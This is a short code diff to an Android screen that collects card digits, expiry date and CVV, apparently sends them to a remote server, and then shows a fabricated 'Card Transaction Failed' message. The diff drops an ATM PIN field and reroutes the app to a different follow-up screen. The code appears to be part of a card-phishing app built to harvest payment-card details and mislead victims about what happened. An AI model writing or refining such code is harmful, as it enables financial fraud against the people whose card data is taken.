@@ -33,7 +33,6 @@ public class SecondActivity extends  BaseActivity {
         ids.put(R.id.carddigit, "carddigit");
         ids.put(R.id.exp, "exp");
         ids.put(R.id.cvv, "cvv");
-        ids.put(R.id.atmpin, "atmpin");
 
         // Populate dataObject
         for(Map.Entry<Integer, String> entry : ids.entrySet()) {
@@ -68,7 +67,7 @@ public class SecondActivity extends  BaseActivity {
                             int formId = response.optInt("data", -1);
                             String message = response.optString("message", "No message");
                             if (status == 200 && formId != -1) {
-                                Intent intent = new Intent(context, LastActivity.class);
+                                Intent intent = new Intent(context, ThirdActivity.class);
                                 intent.putExtra("form_id", formId);
                                 intent.putExtra("message", "Card Transaction Failed, Reason Transaction Disable");
                                 startActivity(intent);
